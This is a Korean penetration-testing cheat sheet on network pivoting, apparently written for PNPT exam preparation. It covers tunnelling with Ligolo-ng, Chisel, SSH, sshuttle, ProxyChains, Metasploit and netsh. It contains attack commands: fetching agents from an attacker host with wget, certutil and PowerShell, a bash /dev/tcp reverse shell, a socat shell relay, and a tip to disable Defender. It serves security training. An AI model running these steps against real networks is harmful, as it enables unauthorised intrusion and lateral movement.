이 글은 TCM Security의 PNPT(Practical Network Penetration Tester) 자격증 취득을 위한 피벗팅 기법 치트시트 이다

피벗팅은 외부 침투로 확보한 거점을 통해 직접 접근할 수 없는 내부 네트워크로 이동하는 기술이다

### [피벗팅 공격 흐름]

피벗팅에선 이중 인터페이스를 가진 호스트를 경유점으로 삼아 내부망에 접근하는것이 목표이다

※이중 인터페이스 = 외부랑 내부 양쪽에 연결된 호스트(웹서버 같은 경우 인터넷 접근(외부)과 DB서버(내부)가 있다)

```less
[외부 침투로 거점 호스트 쉘 획득]

1단계. 네트워크 인터페이스 확인
  ip addr / ipconfig /all로 이중 인터페이스 확인
  내부 서브넷 범위 파악

[거점 호스트가 두 네트워크를 연결하는 dual-homed 호스트 확인]

2단계. 피벗팅 도구 선택 및 설정
  바이너리 업로드 가능 → Ligolo-ng (최우선 권장)
  SSH + Python 존재  → sshuttle (가장 간편)
  SSH만 존재        → SSH -D + ProxyChains
  SSH 없음(Windows) → Chisel 리버스 SOCKS

3단계. 터널 설정 후 내부망 검증
  ping 아닌 TCP 기반으로 검증 (ping은 SOCKS에서 불가)
  nmap -sT -Pn -n 으로 내부 호스트 스캔

4단계. 내부망 열거 → AD 공격
  CrackMapExec/NetExec으로 SMB 호스트 열거
  BloodHound, Kerberoasting 등 AD 공격 진행

[도메인 컨트롤러 장악 → 스크린샷 → 보고서]
```

※이중 인터페이스 발견 즉시 스크린샷을 찍어야 한다 보고서에 피벗팅 경로가 없으면 감점 대상이다

### [1단계 : 네트워크 인터페이스 확인]

네트워크 인터페이스 확인 단계에선 거점 호스트가 내부망과 연결되어 있는지 파악하는것이 목표이다

### [1-1 : 인터페이스 및 내부 호스트 발견]

**사용 조건:**

```
1.거점 호스트에 쉘 접근 보유
```

**공격 흐름 + 명령어:**

```python
(공격 흐름)

1.ip addr / ipconfig로 인터페이스 확인
2.서로 다른 서브넷이 두 개 이상 보이면 dual-homed 호스트
3.라우팅 테이블로 내부 네트워크 범위 파악
4.ARP 캐시로 내부에 이미 통신한 호스트 발견

--------------------------------------------------------------

(Linux)

ip addr                       # 모든 인터페이스 확인
ip route                      # 라우팅 테이블
arp -a                        # ARP 캐시 (내부 호스트 힌트)

--------------------------------------------------------------

(Windows)

ipconfig /all
route print
arp -a
```

※서로 다른 서브넷 주소가 두 개 이상 보이면 피벗 포인트를 발견한 것이다

### [2단계 : Ligolo-ng]

Ligolo-ng 단계에선 TUN 인터페이스(가상 네트워크 인터페이스) 기반 VPN 터널을 생성하여 내부망 전체에 직접 접근하는것이 목표이다

ProxyChains 없이 모든 도구를 그대로 사용할 수 있어 TCM Security에서 현재 가장 권장하는 피벗팅 도구이다

### [2-1 : 설치 및 다운로드]

**사용 조건:**

```less
1.공격자 머신(Kali)에 sudo 권한 보유
2.거점 호스트에 파일 업로드 가능
3.proxy와 agent 버전이 반드시 일치해야 함
```

**공격 흐름 + 명령어:**

```sql
(공격 흐름)

1.공격자 머신에 proxy 설치
2.거점 호스트 OS에 맞는 agent 다운로드
3.agent를 거점 호스트로 전송

--------------------------------------------------------------

(공격자 머신 - proxy 설치)

# Kali 패키지 설치 (가장 간단)
sudo apt update && sudo apt install ligolo-ng

# 또는 GitHub 바이너리 직접 다운로드
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz

--------------------------------------------------------------

(agent 다운로드 - OS별)

# Linux 타겟용
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz

# Windows 타겟용
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip

--------------------------------------------------------------

(거점 호스트로 agent 전송)

# 공격자: HTTP 서버 실행
python3 -m http.server 80

# Linux 거점
wget http://[ATTACKER-IP]/agent && chmod +x agent

# Windows 거점
certutil -urlcache -f http://[ATTACKER-IP]/agent.exe agent.exe
powershell iwr -Uri http://[ATTACKER-IP]/agent.exe -OutFile agent.exe
```

### [2-2 : 프록시 서버 설정 — 공격자 머신]

**사용 조건:**

```
1.공격자 머신에 sudo 권한 보유
```

**공격 흐름 + 명령어:**

```csharp
(공격 흐름)

1.TUN 인터페이스 생성 (최초 1회)
2.proxy 서버 시작
3.에이전트 연결 대기

--------------------------------------------------------------

(명령어)

# TUN 인터페이스 생성 (최초 1회만 실행)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# proxy 서버 시작 (자체서명 인증서, 랩/시험 환경)
./proxy -selfcert

# 포트 변경 시 (기본 11601)
./proxy -selfcert -laddr 0.0.0.0:443
```

### [2-3 : 에이전트 실행 — 거점 호스트]

**사용 조건:**

```
1.거점 호스트에 agent 파일 존재
2.공격자 머신의 proxy가 실행 중
```

**공격 흐름 + 명령어:**

```perl
(공격 흐름)

1.거점 호스트에서 agent 실행
2.공격자 proxy IP와 포트로 연결
3.proxy 콘솔에서 세션 확인

--------------------------------------------------------------

(명령어)

# Linux 거점
./agent -connect [ATTACKER-IP]:11601 -ignore-cert

# Windows 거점
.\agent.exe -connect [ATTACKER-IP]:11601 -ignore-cert
```

※agent는 관리자/root 권한 없이도 실행 가능하다. Windows에서 AV가 차단하면 Defender 비활성화 후 시도

### [2-4 : 세션 연결 및 라우팅 설정]

**사용 조건:**

```
1.proxy 콘솔에 에이전트 세션 연결됨
```

**공격 흐름 + 명령어:**

```csharp
(공격 흐름)

1.proxy 콘솔에서 세션 선택
2.에이전트의 네트워크 인터페이스 확인
3.내부 서브넷 범위 파악
4.터널 시작
5.공격자 머신에서 라우팅 추가
6.내부망 접근 확인

--------------------------------------------------------------

(proxy 콘솔 명령어)

# 세션 목록 확인 및 선택
ligolo-ng » session
? Specify a session : 1

# 에이전트 네트워크 인터페이스 확인 (핵심!)
[Agent : user@pivot] » ifconfig
# eth0: 192.168.x.x (외부망)
# eth1: 172.16.5.x  (내부망 ← 피벗 대상!)

# 터널 시작
[Agent : user@pivot] » start

--------------------------------------------------------------

(공격자 머신 - 별도 터미널에서 라우팅 추가)

sudo ip route add 172.16.5.0/24 dev ligolo

# 라우팅 확인
ip route | grep ligolo

--------------------------------------------------------------

(내부망 접근 확인 - TCP 기반으로!)

nmap -sT -Pn -n -p 22,80,445 172.16.5.10
```

※ping으로 확인하지 말고 반드시 nmap -sT -Pn 으로 TCP 연결을 확인해야 한다

### [2-5 : 리스너 — 내부 호스트에서 리버스 쉘 받기]

내부 호스트에서 공격자로 리버스 쉘을 보낼 때 피벗 호스트가 중계 역할을 한다

**사용 조건:**

```
1.Ligolo-ng 터널 활성화 상태
2.내부 타겟에서 리버스 쉘 실행 가능
```

**공격 흐름 + 명령어:**

```sql
(공격 흐름)

1.proxy 콘솔에서 리스너 추가
2.공격자 머신에서 netcat 리스너 시작
3.내부 타겟에서 피벗 호스트 내부 IP로 리버스 쉘 실행
4.공격자 netcat으로 쉘 수신

--------------------------------------------------------------

(proxy 콘솔 - 리스너 추가)

[Agent : user@pivot] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

--------------------------------------------------------------

(공격자 머신 - netcat 리스너)

nc -lvnp 4444

--------------------------------------------------------------

(내부 타겟에서 실행 - 피벗 호스트 내부 IP로!)

bash -i >& /dev/tcp/172.16.5.1/4444 0>&1

--------------------------------------------------------------

(리스너 관리)

listener_list           # 활성 리스너 목록
listener_stop --id 0    # 특정 리스너 중지
```

### [2-6 : 이중 피벗 (Double Pivot)]

거점 호스트를 통해 세 번째 네트워크 세그먼트까지 접근해야 할 때 사용한다

**사용 조건:**

```
1.Pivot1 세션이 활성화된 상태
2.Pivot2가 세 번째 네트워크(172.16.200.0/24)에도 연결됨
```

**공격 흐름 + 명령어:**

```sql
(공격 흐름)

1.공격자 머신에 두 번째 TUN 인터페이스 생성
2.Pivot1 세션에서 proxy 포트 리스너 추가
3.Pivot2에서 agent 실행 (Pivot1 내부 IP로 연결)
4.두 번째 TUN 인터페이스에서 터널 시작

--------------------------------------------------------------

(공격자 머신 - 두 번째 TUN 인터페이스)

sudo ip tuntap add user kali mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add 172.16.200.0/24 dev ligolo2

--------------------------------------------------------------

(proxy 콘솔 - Pivot1 세션에서 리스너 추가)

[Agent : user@pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

--------------------------------------------------------------

(Pivot2에서 agent 실행 - Pivot1 내부 IP로 연결)

./agent -connect 172.16.150.10:11601 -ignore-cert

--------------------------------------------------------------

(proxy 콘솔 - Pivot2 세션 선택 후 두 번째 TUN에서 터널 시작)

ligolo-ng » session → 2 선택
[Agent : admin@pivot2] » tunnel_start --tun ligolo2

# 이제 172.16.200.0/24 직접 접근 가능!
```

### [3단계 : Chisel]

Chisel 단계에선 HTTP WebSocket 기반 터널로 SOCKS5 프록시를 생성하여 내부망에 접근하는것이 목표이다

SSH가 없는 환경이나 HTTP만 허용되는 방화벽 뒤에서 유용하다

### [3-1 : 리버스 SOCKS5 프록시 (가장 일반적인 패턴)]

**사용 조건:**

```
1.공격자 머신과 거점 호스트에 chisel 바이너리 존재
2.거점 호스트에서 공격자로 아웃바운드 연결 가능
```

**공격 흐름 + 명령어:**

```markdown
(공격 흐름)

1.공격자 머신에서 chisel 서버 시작
2.거점 호스트에서 chisel 클라이언트 실행
3.공격자의 127.0.0.1:1080에 SOCKS5 프록시 생성
4.ProxyChains 설정 후 내부망 접근

--------------------------------------------------------------

(공격자 머신 - 서버)

chisel server --reverse --port 8080

--------------------------------------------------------------

(거점 호스트 - 클라이언트)

# Linux
./chisel client [ATTACKER-IP]:8080 R:socks

# Windows
.\chisel.exe client [ATTACKER-IP]:8080 R:socks

--------------------------------------------------------------

(공격자 머신 - ProxyChains 설정)

# /etc/proxychains4.conf 마지막 줄에 추가
socks5 127.0.0.1 1080

--------------------------------------------------------------

(내부망 접근 - 반드시 -sT -Pn -n 옵션!)

proxychains nmap -sT -Pn -n -p 22,80,445 172.16.5.10
proxychains crackmapexec smb 172.16.5.0/24
```

### [3-2 : 리버스 포트 포워딩 (특정 포트만)]

특정 서비스 하나에만 접근할 때 SOCKS 없이 단일 포트만 포워딩한다

**사용 조건:**

```
1.공격자 머신에서 chisel 서버 실행 중
```

**공격 흐름 + 명령어:**

```perl
(명령어)

# 공격자 서버
chisel server --reverse -p 8000

# 거점에서: 공격자의 포트 → 타겟의 포트로 포워딩
./chisel client [ATTACKER-IP]:8000 R:8080:172.16.5.19:80

# 복수 포트 동시 포워딩
./chisel client [ATTACKER-IP]:8000 R:80:127.0.0.1:80 R:3389:172.16.5.19:3389

# 이후 공격자에서 직접 접근
curl http://127.0.0.1:8080
xfreerdp /v:127.0.0.1:3389 /u:admin /p:password
```

### [4단계 : SSH 터널링]

SSH 터널링 단계에선 거점 호스트의 SSH를 이용해 별도 도구 없이 피벗팅하는것이 목표이다

거의 모든 Linux 서버에 SSH가 있으므로 추가 바이너리 업로드 없이 즉시 사용 가능하다

### [4-1 : 동적 포트 포워딩 (-D) — SOCKS 프록시]

전체 서브넷에 동적으로 접근하는 SOCKS 프록시를 생성한다

**사용 조건:**

```less
1.거점 호스트에 SSH 접근 가능 (자격증명 또는 키 보유)
```

**공격 흐름 + 명령어:**

```yaml
(공격 흐름)

1.공격자에서 SSH 동적 포워딩 실행
2.공격자의 127.0.0.1:1080에 SOCKS 프록시 생성
3.ProxyChains 설정 후 내부망 접근

--------------------------------------------------------------

(명령어)

# 기본
ssh -D 1080user@[PIVOT-IP]

# 백그라운드, 쉘 없이 (권장)
ssh -D 1080 -C -N -f user@[PIVOT-IP]

# SSH 키 사용
ssh -i id_rsa -D 1080 -C -N -f user@[PIVOT-IP]

# 옵션 설명
# -D : 동적 포트 포워딩 (SOCKS 프록시)
# -N : 원격 명령 실행 안 함 (터널 전용)
# -f : 백그라운드 실행
# -C : 압축 활성화
```

### [4-2 : 로컬 포트 포워딩 (-L) — 특정 서비스 접근]

내부의 특정 서비스 하나를 로컬 포트로 가져온다

**사용 조건:**

```
1.거점 호스트에 SSH 접근 가능
```

**공격 흐름 + 명령어:**

```perl
(명령어)

# 기본 형식
ssh -L [로컬포트]:[타겟호스트]:[타겟포트] user@[PIVOT-IP]

# 내부 웹서버 접근
ssh -L 8080:172.16.5.19:80 user@10.10.10.50
# → http://127.0.0.1:8080 으로 접근

# 내부 RDP 포워딩
ssh -L 1337:172.16.5.50:3389 user@10.10.10.50 -i id_rsa -N -f
xfreerdp /v:127.0.0.1:1337 /u:admin /p:password
```

### [4-3 : ProxyJump (-J) — 멀티홉 SSH]

중간 호스트를 거쳐 최종 타겟에 SSH로 직접 접속한다

**사용 조건:**

```
1.Pivot1과 최종 타겟 모두 SSH 접근 가능
```

**공격 흐름 + 명령어:**

```coffeescript
(명령어)

# 단일 점프
ssh -J user@pivot user@target

# 이중 점프
ssh -J user1@hop1,user2@hop2 user3@final_target
```

### [5단계 : sshuttle]

sshuttle 단계에선 SSH를 VPN처럼 사용하여 내부망 전체에 투명하게 접근하는것이 목표이다

ProxyChains 없이 모든 도구를 그대로 사용할 수 있다는 점이 장점이다

**사용 조건:**

```less
1.거점 호스트에 SSH 접근 가능
2.거점 호스트에 Python 설치되어 있어야 함
3.공격자 머신에 sudo 권한 필요 (iptables 수정)
```

**공격 흐름 + 명령어:**

```sql
(공격 흐름)

1.공격자에서 sshuttle 실행
2.자동으로 iptables 규칙 생성 → 투명한 라우팅
3.ProxyChains 없이 내부망에 직접 접근

--------------------------------------------------------------

(명령어)

# 기본
sshuttle -r user@[PIVOT-IP] 172.16.5.0/24

# SSH 키 사용
sshuttle -r user@[PIVOT-IP] --ssh-cmd "ssh -i id_rsa" 172.16.0.0/24

# 피벗 호스트 IP 제외 (라우팅 루프 방지)
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5

# DNS 포함
sshuttle --dns -r user@[PIVOT-IP] 172.16.0.0/24

# 백그라운드 실행
sshuttle -D --pidfile /tmp/sshuttle.pid -r user@[PIVOT-IP] 172.16.0.0/24
```

※sshuttle은 TCP만 지원하며 UDP와 ICMP는 불가하며 Windows 타겟(Python 없음) 또한 사용 불가하다

### [6단계 : ProxyChains 설정]

ProxyChains 단계에선 SOCKS 프록시를 통해 외부 도구들이 내부망에 접근하도록 설정하는것이 목표이다

Chisel, SSH -D, Metasploit socks_proxy 등 SOCKS 기반 피벗팅에 필수 동반 도구이다

### [6-1 : 설정 파일 편집 및 도구 연동]

**사용 조건:**

```less
1.SOCKS 프록시가 이미 활성화된 상태
   (Chisel R:socks, SSH -D 1080, Metasploit socks_proxy 등)
```

**공격 흐름 + 명령어:**

```csharp
(공격 흐름)

1.프록시 타입과 포트 확인
2./etc/proxychains4.conf 편집
3.도구 앞에 proxychains 붙여서 실행

--------------------------------------------------------------

(/etc/proxychains4.conf 편집)

dynamic_chain           # 죽은 프록시 건너뜀 — 일반 피벗팅에 권장
#strict_chain           # 단일 안정 프록시 사용 시

# DNS 누출 방지 (nmap 사용 시 hang 발생하면 주석 처리)
proxy_dns

tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080

--------------------------------------------------------------

(도구 연동 - 반드시 -sT -Pn -n 사용!)

proxychains nmap -sT -Pn -n --top-ports 50 [TARGET-IP]
proxychains nmap -sT -Pn -n -sV -p 22,80,445 [TARGET-IP]
proxychains crackmapexec smb [TARGET-IP] -u 'admin' -p 'password'
proxychains netexec smb 172.16.5.0/24
proxychains evil-winrm -i [TARGET-IP] -u administrator -p 'Password123!'
proxychains ssh root@[TARGET-IP]
proxychains xfreerdp /v:[TARGET-IP] /u:user /p:password /cert:ignore
```

※nmap에서 -sS(SYN 스캔)는 작동하지 않는다. 반드시 -sT(TCP Connect)를 사용해야 한다

※proxy_dns가 활성화된 상태에서 nmap이 hang되면 주석 처리하고 -n 플래그를 추가한다

### 

### [7단계 : Metasploit 피벗팅]

Metasploit 피벗팅 단계에선 Meterpreter 세션을 이용해 라우팅과 SOCKS 프록시를 설정하는것이 목표이다

### [7-1 : autoroute + SOCKS 프록시]

**사용 조건:**

```
1.거점 호스트에 Meterpreter 세션 확보
```

**공격 흐름 + 명령어:**

```bash
(공격 흐름)

1.Meterpreter 세션에서 autoroute로 내부 서브넷 라우팅 추가
2.socks_proxy 모듈로 SOCKS 프록시 생성
3.ProxyChains 설정 후 외부 도구 사용

--------------------------------------------------------------

(Meterpreter 세션에서)

meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -p               # 확인

--------------------------------------------------------------

(SOCKS 프록시 모듈)

msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j                                # 백그라운드 Job으로 실행
msf6 > jobs                                  # 실행 중인 잡 확인

--------------------------------------------------------------

(Metasploit 내장 스캐너 - autoroute만으로 사용 가능)

msf6 > use post/multi/gather/ping_sweep
msf6 > set RHOSTS 10.10.10.0/24
msf6 > set SESSION 1 && run

msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.10.10.20
msf6 > set PORTS 22,80,445,3389 && run
```

### [7-2 : Meterpreter 포트 포워딩]

SOCKS 없이 특정 포트만 직접 매핑할 때 사용한다

```
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.20
# → http://127.0.0.1:8080 으로 접근

meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.20

meterpreter > portfwd list
meterpreter > portfwd flush
```

### [8단계 : 포트 포워딩 보조 도구]

### [8-1 : socat — Linux 피벗에서 포트 릴레이]

거점 Linux 호스트에서 특정 포트를 내부 서비스로 포워딩할 때 사용한다

**사용 조건:**

```
1.거점 Linux 호스트에 socat 설치 또는 바이너리 업로드
```

**공격 흐름 + 명령어:**

```perl
(명령어)

# TCP 포트 포워딩
socat TCP-LISTEN:33060,fork,reuseaddr TCP:172.16.5.19:3306 &

# 리버스 쉘 릴레이 (내부 타겟 쉘을 공격자로 중계)
socat TCP-LISTEN:8000,fork TCP:[ATTACKER-IP]:443

# 종료
kill $(pgrep socat)
```

### [8-2 : netsh — Windows 피벗에서 내장 포트 포워딩]

Windows 거점에서 별도 도구 업로드 없이 포트 포워딩할 때 사용한다

**사용 조건:**

```
1.Windows 거점 호스트에 관리자 권한 보유
```

**공격 흐름 + 명령어:**

```python
(명령어)

# 포트 포워딩 규칙 추가
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=172.16.5.19 connectport=4444

# 방화벽 규칙 추가 (필요 시)
netsh advfirewall firewall add rule name="fwd" dir=in action=allow protocol=TCP localport=4444

# 규칙 확인
netsh interface portproxy show all

# 규칙 삭제
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### 도구 선택 기준 요약

```less
[상황별 권장 도구]

바이너리 업로드 가능          → Ligolo-ng (ProxyChains 불필요, 최우선 권장)
SSH + Python 존재            → sshuttle (ProxyChains 불필요, 가장 간편)
SSH만 있음                   → SSH -D + ProxyChains
SSH 없음 (Windows 쉘만)      → Chisel 리버스 SOCKS + ProxyChains
Meterpreter 세션 보유        → autoroute + socks_proxy + ProxyChains
Windows 관리자 권한, 급할 때  → netsh (업로드 불필요)
특정 포트 하나만 필요         → SSH -L 또는 socat
```

### ProxyChains 사용 시 절대 규칙

```bash
nmap 명령에 반드시 포함해야 할 플래그:
	-sT    : TCP Connect 스캔 (SYN 스캔 불가)
	-Pn    : 호스트 검색 비활성화 (ping 불가)
	-n     : DNS 해석 비활성화 (hang 방지)

틀린 예: proxychains nmap -sS 172.16.5.10
옳은 예: proxychains nmap -sT -Pn -n -p 445,3389 172.16.5.10
```

※SOCKS를 통한 ICMP(ping)는 원천적으로 불가하다 = ping이 안 된다고 피벗팅 실패가 아니다
